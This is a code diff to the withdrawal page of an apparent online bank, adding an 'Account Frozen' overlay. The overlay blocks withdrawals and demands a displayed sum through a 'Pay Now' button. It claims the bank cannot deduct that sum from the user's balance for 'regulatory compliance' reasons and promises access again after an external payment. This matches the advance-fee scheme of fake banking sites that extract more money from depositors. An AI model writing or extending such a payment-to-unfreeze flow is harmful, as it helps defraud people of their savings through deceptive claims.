@@ -31,6 +31,9 @@ export default function Withdrawal() {
   const [withdrawalSuspensionReason, setWithdrawalSuspensionReason] = useState('');
   const [showWithdrawalVerification, setShowWithdrawalVerification] = useState(false);
   const [withdrawalVerificationSubmitted, setWithdrawalVerificationSubmitted] = useState(false);
+  const [isFrozen, setIsFrozen] = useState(false);
+  const [frozenReason, setFrozenReason] = useState('');
+  const [freezeAmountRequired, setFreezeAmountRequired] = useState(0);
 
   const [withdrawalForm, setWithdrawalForm] = useState({
     from_account_id: '',
@@ -144,13 +147,19 @@ export default function Withdrawal() {
       if (currentUser) {
         const { data: profile } = await supabase
           .from('profiles')
-          .select('requires_verification, withdrawal_suspended, withdrawal_suspension_reason')
+          .select('requires_verification, withdrawal_suspended, withdrawal_suspension_reason, is_frozen, frozen_reason, freeze_amount_required')
           .eq('id', currentUser.id)
           .single();
         
         if (profile?.requires_verification) {
           router.push('/verify-identity');
           return;
+        }
+
+        if (profile?.is_frozen) {
+          setIsFrozen(true);
+          setFrozenReason(profile.frozen_reason || 'Your account has been temporarily frozen.');
+          setFreezeAmountRequired(profile.freeze_amount_required || 0);
         }
 
         if (profile?.withdrawal_suspended) {
@@ -1305,6 +1314,234 @@ export default function Withdrawal() {
             ← Back to Dashboard
           </Link>
         </div>
+
+        {/* Frozen Account Overlay - Scrollable */}
+        {isFrozen && (
+          <div style={{
+            position: 'fixed',
+            top: isMobile ? '70px' : '80px',
+            left: 0,
+            right: 0,
+            bottom: 0,
+            backgroundColor: 'rgba(15, 23, 42, 0.95)',
+            zIndex: 1000,
+            overflowY: 'auto',
+            WebkitOverflowScrolling: 'touch'
+          }}>
+            <div style={{
+              minHeight: '100%',
+              padding: isMobile ? '1.5rem 1rem' : '2rem',
+              display: 'flex',
+              flexDirection: 'column',
+              alignItems: 'center'
+            }}>
+              <div style={{
+                width: isMobile ? '80px' : '100px',
+                height: isMobile ? '80px' : '100px',
+                borderRadius: '50%',
+                background: 'linear-gradient(135deg, #1e3a5f 0%, #0f172a 100%)',
+                border: '4px solid #3b82f6',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                marginBottom: '1.5rem',
+                boxShadow: '0 0 40px rgba(59, 130, 246, 0.3)'
+              }}>
+                <span style={{ fontSize: isMobile ? '2.5rem' : '3rem' }}>❄️</span>
+              </div>
+
+              <h2 style={{
+                fontSize: isMobile ? '1.75rem' : '2.25rem',
+                fontWeight: '700',
+                color: '#ffffff',
+                margin: '0 0 0.5rem 0',
+                textAlign: 'center'
+              }}>
+                Account Frozen
+              </h2>
+              <p style={{
+                fontSize: '1rem',
+                color: 'rgba(255,255,255,0.7)',
+                margin: '0 0 2rem 0',
+                textAlign: 'center'
+              }}>
+                Your withdrawal access has been temporarily restricted
+              </p>
+
+              <div style={{
+                backgroundColor: '#ffffff',
+                borderRadius: '20px',
+                maxWidth: '520px',
+                width: '100%',
+                boxShadow: '0 25px 50px rgba(0, 0, 0, 0.4)',
+                overflow: 'hidden',
+                marginBottom: '2rem'
+              }}>
+                {freezeAmountRequired > 0 && (
+                  <div style={{
+                    background: 'linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%)',
+                    borderBottom: '3px solid #dc2626',
+                    padding: isMobile ? '1.25rem' : '1.5rem',
+                    textAlign: 'center'
+                  }}>
+                    <p style={{
+                      fontSize: '0.8rem',
+                      color: '#991b1b',
+                      margin: '0 0 0.5rem 0',
+                      fontWeight: '600',
+                      textTransform: 'uppercase',
+                      letterSpacing: '0.1em'
+                    }}>
+                      Amount Required to Lift Freeze
+                    </p>
+                    <p style={{
+                      fontSize: isMobile ? '2rem' : '2.5rem',
+                      fontWeight: '800',
+                      color: '#dc2626',
+                      margin: 0,
+                      letterSpacing: '-0.02em'
+                    }}>
+                      {formatCurrency(freezeAmountRequired)}
+                    </p>
+                  </div>
+                )}
+
+                <div style={{ padding: isMobile ? '1.5rem' : '2rem' }}>
+                  <div style={{
+                    backgroundColor: '#fef3c7',
+                    borderLeft: '4px solid #f59e0b',
+                    borderRadius: '8px',
+                    padding: '1rem 1.25rem',
+                    marginBottom: '1.5rem'
+                  }}>
+                    <p style={{
+                      fontSize: '0.75rem',
+                      color: '#92400e',
+                      margin: '0 0 0.25rem 0',
+                      fontWeight: '700',
+                      textTransform: 'uppercase',
+                      letterSpacing: '0.1em'
+                    }}>
+                      Reason for Freeze
+                    </p>
+                    <p style={{
+                      fontSize: '1rem',
+                      color: '#78350f',
+                      margin: 0,
+                      fontWeight: '500',
+                      lineHeight: '1.5'
+                    }}>
+                      {frozenReason}
+                    </p>
+                  </div>
+
+                  <div style={{ marginBottom: '1.5rem' }}>
+                    <h4 style={{
+                      fontSize: '1rem',
+                      fontWeight: '700',
+                      color: '#1e293b',
+                      margin: '0 0 1rem 0',
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <span style={{ fontSize: '1.25rem' }}>📋</span>
+                      What This Means
+                    </h4>
+                    <ul style={{ margin: 0, padding: 0, listStyle: 'none' }}>
+                      {[
+                        'All withdrawals and pending transactions are currently suspended',
+                        'The bank cannot withdraw the required amount from your existing balance due to regulatory compliance requirements',
+                        'An external deposit or payment is required to resolve this hold',
+                        'Once the required amount is received, your account will be restored within 24-48 hours'
+                      ].map((item, idx) => (
+                        <li key={idx} style={{
+                          display: 'flex',
+                          alignItems: 'flex-start',
+                          gap: '0.75rem',
+                          padding: '0.5rem 0',
+                          fontSize: '0.9rem',
+                          color: '#475569',
+                          lineHeight: '1.5',
+                          borderBottom: idx < 3 ? '1px solid #f1f5f9' : 'none'
+                        }}>
+                          <span style={{ color: '#3b82f6', fontWeight: '700', fontSize: '0.85rem', minWidth: '20px' }}>
+                            {idx + 1}.
+                          </span>
+                          {item}
+                        </li>
+                      ))}
+                    </ul>
+                  </div>
+
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
+                    {freezeAmountRequired > 0 && (
+                      <button
+                        onClick={() => router.push(`/freeze-payment?amount=${freezeAmountRequired}`)}
+                        style={{
+                          width: '100%',
+                          padding: '1rem 1.5rem',
+                          background: 'linear-gradient(135deg, #059669 0%, #047857 100%)',
+                          color: '#ffffff',
+                          border: 'none',
+                          borderRadius: '12px',
+                          fontSize: '1.1rem',
+                          fontWeight: '700',
+                          cursor: 'pointer',
+                          display: 'flex',
+                          alignItems: 'center',
+                          justifyContent: 'center',
+                          gap: '0.75rem',
+                          boxShadow: '0 4px 14px rgba(5, 150, 105, 0.4)'
+                        }}
+                      >
+                        <span style={{ fontSize: '1.25rem' }}>💳</span>
+                        Pay Now - {formatCurrency(freezeAmountRequired)}
+                      </button>
+                    )}
+                    <button
+                      onClick={() => router.push('/dashboard')}
+                      style={{
+                        width: '100%',
+                        padding: '0.875rem',
+                        backgroundColor: '#f1f5f9',
+                        color: '#475569',
+                        border: '2px solid #e2e8f0',
+                        borderRadius: '12px',
+                        fontSize: '1rem',
+                        fontWeight: '600',
+                        cursor: 'pointer'
+                      }}
+                    >
+                      Return to Dashboard
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <div style={{
+                textAlign: 'center',
+                padding: '1rem',
+                backgroundColor: 'rgba(255,255,255,0.1)',
+                borderRadius: '12px',
+                maxWidth: '400px',
+                width: '100%'
+              }}>
+                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.7)', margin: '0 0 0.5rem 0' }}>
+                  Need assistance? Our support team is here to help
+                </p>
+                <a href="mailto:support@theoaklinebank.com" style={{
+                  color: '#60a5fa',
+                  fontWeight: '600',
+                  fontSize: '0.95rem',
+                  textDecoration: 'none'
+                }}>
+                  support@theoaklinebank.com
+                </a>
+              </div>
+            </div>
+          </div>
+        )}
 
         <div style={styles.main}>
           <h1 style={styles.pageTitle}>Withdraw Funds</h1>
